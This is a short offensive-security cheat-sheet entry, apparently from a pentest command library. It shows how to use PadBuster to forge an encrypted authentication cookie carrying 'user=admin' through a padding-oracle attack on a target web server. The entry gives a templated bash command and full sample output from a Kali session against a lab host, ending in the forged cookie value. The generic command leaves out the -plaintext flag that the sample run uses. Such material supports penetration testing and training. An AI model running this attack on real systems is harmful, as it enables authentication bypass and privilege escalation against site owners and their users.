---
id: 53e08a6a-364e-4e79-a16d-45db57c1e2c3
name: PadBuster Encrypting Plaintext into a Cookie
type: command
executor: bash
data: padbuster http://$TARGET_IP $COOKIE 8 -cookies $COOKIE_NAME=$COOKIE -encoding
  0
output: 'root@kali:~# padbuster http://10.10.10.18 vUTZknJSU7A%2BJ02NeAP2MingCdt8ctB2
  8 -cookies ''auth=vUTZknJSU7A%2BJ02NeAP2MingCdt8ctB2'' -encoding 0 -plaintext user=admin


  +-------------------------------------------+

  | PadBuster - v0.3.3                        |

  | Brian Holyfield - Gotham Digital Science  |

  | labs@gdssecurity.com                      |

  +-------------------------------------------+


  INFO: The original request returned the following

  [+] Status: 200

  [+] Location: N/A

  [+] Content Length: 978


  INFO: Starting PadBuster Encrypt Mode

  [+] Number of Blocks: 2


  INFO: No error string was provided...starting response analysis


  *** Response Analysis Complete ***


  The following response signatures were returned:


  -------------------------------------------------------

  ID#     Freq    Status  Length  Location

  -------------------------------------------------------

  1       1       200     1133    N/A

  2 **    255     200     15      N/A

  -------------------------------------------------------


  Enter an ID that matches the error condition

  NOTE: The ID# marked with ** is recommended : 2

  ...

  ...

  Block 1 Results:

  [+] New Cipher Text (HEX): 0408ad19d62eba93

  [+] Intermediate Bytes (HEX): 717bc86beb4fdefe


  -------------------------------------------------------

  ** Finished ***


  [+] Encrypted value is: BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA

  -------------------------------------------------------'
created_at: '2019-10-24T00:47:43.802011+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# PadBuster Encrypting Plaintext into a Cookie

```bash
padbuster http://$TARGET_IP $COOKIE 8 -cookies $COOKIE_NAME=$COOKIE -encoding 0
```

## Expected Output

```
root@kali:~# padbuster http://10.10.10.18 vUTZknJSU7A%2BJ02NeAP2MingCdt8ctB2 8 -cookies 'auth=vUTZknJSU7A%2BJ02NeAP2MingCdt8ctB2' -encoding 0 -plaintext user=admin

+-------------------------------------------+
| PadBuster - v0.3.3                        |
| Brian Holyfield - Gotham Digital Science  |
| labs@gdssecurity.com                      |
+-------------------------------------------+

INFO: The original request returned the following
[+] Status: 200
[+] Location: N/A
[+] Content Length: 978

INFO: Starting PadBuster Encrypt Mode
[+] Number of Blocks: 2

INFO: No error string was provided...starting response analysis

*** Response Analysis Complete ***

The following response signatures were returned:

-------------------------------------------------------
ID#     Freq    Status  Length  Location
-------------------------------------------------------
1       1       200     1133    N/A
2 **    255     200     15      N/A
-------------------------------------------------------

Enter an ID that matches the error condition
NOTE: The ID# marked with ** is recommended : 2
...
...
Block 1 Results:
[+] New Cipher Text (HEX): 0408ad19d62eba93
[+] Intermediate Bytes (HEX): 717bc86beb4fdefe

-------------------------------------------------------
** Finished ***

[+] Encrypted value is: BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA
-------------------------------------------------------
```


